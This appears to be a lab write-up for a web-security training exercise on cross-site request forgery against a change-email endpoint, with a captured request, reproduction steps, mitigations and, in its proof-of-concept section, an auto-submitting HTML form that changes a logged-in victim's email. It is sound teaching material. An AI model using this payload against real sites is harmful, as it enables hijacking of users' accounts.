# Lab 1 — CSRF vulnerability (no defenses) — Clean Write-up

## Title

CSRF — Change Email (No CSRF Token)

## Goal

Exploit a Cross‑Site Request Forgery (CSRF) vulnerability in the application's *change email* functionality to change the victim's email address.

## Target / Credentials

* Target host: `0ab0008304e509aa806a4949004c00d0.web-security-academy.net`
* Test account: `wiener:peter`

---

## Summary

The `POST /my-account/change-email` endpoint accepts an `email` parameter but does not require or verify a CSRF token (or any origin/referrer check). This allows an attacker to craft an HTML page that automatically submits a POST request which changes the logged-in user's email address when they visit the malicious page.

---

## Evidence (Captured request)

```
POST /my-account/change-email HTTP/2
Host: 0ab0008304e509aa806a4949004c00d0.web-security-academy.net
Cookie: session=<user-session-cookie>
Content-Type: application/x-www-form-urlencoded

email=wiener2%40normal-user.net
```

Note: there is no CSRF token or other anti-CSRF parameter in the request body or headers.

---

## Reproduction steps (manual)

1. Open the application and log in with `wiener:peter`.
2. Use Burp (or browser devtools) to intercept the request when changing the email via the application UI.
3. Observe the `POST /my-account/change-email` request and confirm there is no CSRF token and the request only needs the `email` form field.
4. Create a malicious HTML page that automatically submits a `POST` form to that endpoint with an attacker-controlled email value.
5. Host the malicious page on an exploit server (or attacker-controlled site).
6. Have the victim (the logged-in user) visit the malicious page while authenticated to the target — the form submits using the victim's session cookie and the email will be changed.

---

## Proof-of-Concept (exploit HTML)

```html
<!-- PoC: CSRF exploit to change victim's email -->
<form method="POST" action="https://0ab0008304e509aa806a4949004c00d0.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="5wiener@normal-user.net">
</form>
<script>
  // Auto-submit when the page loads
  document.forms[0].submit();
</script>
```

**Usage:** upload this HTML to the exploit server and lure the target to visit it while authenticated. When the form is submitted, the application's session cookie is sent with the request and the email will update.

---

## Result / Expected Outcome

* Successful exploitation changes the victim's account email to the attacker-controlled email `5wiener@normal-user.net` (or whatever value used in the PoC).
* The lab is solved when the email has been changed.

---

## Root Cause

The application accepts state-changing requests without requiring an anti-CSRF token and without validating the request origin (no `Origin`/`Referer` checks). Browsers automatically attach cookies to same-site requests, enabling CSRF when protections are missing.

---

## Suggested Mitigations (defensive guidance)

1. **CSRF tokens**: Add a per-session (or per-request) unpredictable CSRF token in the form and validate it server-side on state-changing POST requests.
2. **SameSite cookie attribute**: Set `Set-Cookie: session=<...>; SameSite=Lax` or `SameSite=Strict` where appropriate to reduce cross-site requests sending cookies. (Note: Lax still allows top‑level GET navigations; for POSTs, token-based defenses are still needed.)
3. **Origin / Referer checks**: Validate `Origin` or `Referer` headers for sensitive actions when feasible.
4. **Re-authentication / confirmation**: For critical changes (email, password), require the user to re-enter their password or confirm via email.
5. **Use POST and require a valid Content-Type**: Ensure the server only accepts requests with an expected `Content-Type` (e.g., `application/x-www-form-urlencoded`) and verify payload contents.

---

## Notes / Tips

* Avoid relying on security-by-obscurity (e.g., secret parameter names) — tokens must be unpredictable and validated server-side.
* CSRF mitigation should be applied to all state-changing endpoints (`POST`, `PUT`, `DELETE`) that rely on cookies for authentication.
* Test mitigations with legitimate legitimate workflows to ensure usability is not broken.

---

*Prepared as a concise lab write-up for submission and review.*
